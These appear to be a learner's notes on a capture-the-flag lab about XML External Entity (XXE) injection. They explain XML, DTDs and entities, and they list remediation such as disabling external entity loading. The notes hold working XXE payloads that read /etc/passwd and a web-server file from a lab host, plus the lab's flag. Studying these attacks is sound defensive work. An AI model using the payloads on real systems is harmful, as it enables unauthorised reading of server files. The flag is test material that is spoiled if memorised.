******************************************************************************************************************************
                    Day 5: SOC-mas XX-what-ee?
******************************************************************************************************************************

Understand the basic concepts related to XMLXML handling data like a file drawer.
Explore XML External Entity (XXE) and its components
Learn how to exploit the vulnerability
Understand remediation measures

Extensible Markup Language (XML)
XML is a commonly used method to transport and store data in a structured format that humans and machines can easily understand.

Example

<people>
   <name>Glitch</name>
   <address>Wareville</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>

Document Type Definition (DTD)
A DTD is a set of rules that defines the structure of an XML document. Just like a database scheme, it acts like a blueprint, telling you what elements (tags) and attributes are allowed in the XML file.

Example

<!DOCTYPE people [
   <!ELEMENT people(name, address, email, phone)>
   <!ELEMENT name (#PCDATA)>
   <!ELEMENT address (#PCDATA)>
   <!ELEMENT email (#PCDATA)>
   <!ELEMENT phone (#PCDATA)>
]>

Entities
Entities in XML are placeholders that allow the insertion of large chunks of data or referencing internal or external files.

Entity reference = &<Entity>;

Example

<!DOCTYPE people [
   <!ENTITY ext SYSTEM "http://tryhackme.com/robots.txt">
]>
<people>
   <name>Glitch</name>
   <address>&ext;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>

We are specifically discussing external entities because it is one of the main reasons that XXE is introduced if it is not properly managed.

XML External Entity (XXE)
XXE is an attack that takes advantage of how XML parsers handle external entities.

Example

<!DOCTYPE people[
   <!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
   <name>Glitch</name>
   <address>&thmFile;</address>
   <email>glitch@wareville.com</email>
   <phone>111000</phone>
</people>

Disable External Entity Loading: The primary fix is to disable external entity loading in your XML parser. In PHP, for example, you can prevent XXE by setting libxml_disable_entity_loader(true) before processing the XML.
Validate and Sanitise User Input: Always validate and sanitise the XML input received from users. This ensures that only expected data is processed, reducing the risk of malicious content being included in the request. For example, remove suspicious keywords like /etc/host, /etc/passwd, etc, from the request.


******************************************
                Investigation
******************************************        

Wareville's WishVille

http://10.10.250.158
http://10.10.250.158/product.php
http://10.10.250.158/wishes/wish_21.txt

<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_2.txt"> ]>
                <wishlist>
                    <user_id>1</user_id>
                    <item>
                        <product_id>
&payload;</product_id>
                    </item>
                </wishlist>

http://10.10.250.158/CHANGELOG

commit 3f786850e387550fdab836ed7e6dc881de23001b (HEAD -> master, origin/master, origin/HEAD)
Author: Mayor Malware - Wareville <mayor@wareville.org>
Date:   Wed Dec 4 21:24:22 2024 +0200

    Fixed the wishlist.php page THM{m4y0r_m4lw4r3_b4ckd00rs}

commit 89e6c98d92887913cadf06b2adb97f26cde4849b (tag: v1.0.0)
Author: Software - Wareville <software@wareville.org>
Date:   Thu Dec 4 14:45:18 2024 +0200

    Almost done with the wishlists page, needs to handle XML parsing

commit 2b66fd261ee5c6cfc8de7fa466bab600bcfe4f69
Author: Software - Wareville <software@wareville.org>
Date:   Tue Dec 2 15:20:57 2024 +0200

    Finally done with the landing page and initial CSS

commit e983f374794de9c64e3d1c1de1d490c0756eeeff
Author: Software - Wareville <software@wareville.org>
Date:   Tue Dec 2 15:19:33 2024 +0200

    Initial commit






*****************************************************
                Commandline Arguments
*****************************************************











*****************************************************
                Section 1
*****************************************************

*****************************************************
                Section 2
*****************************************************

*****************************************************
                Section 3
*****************************************************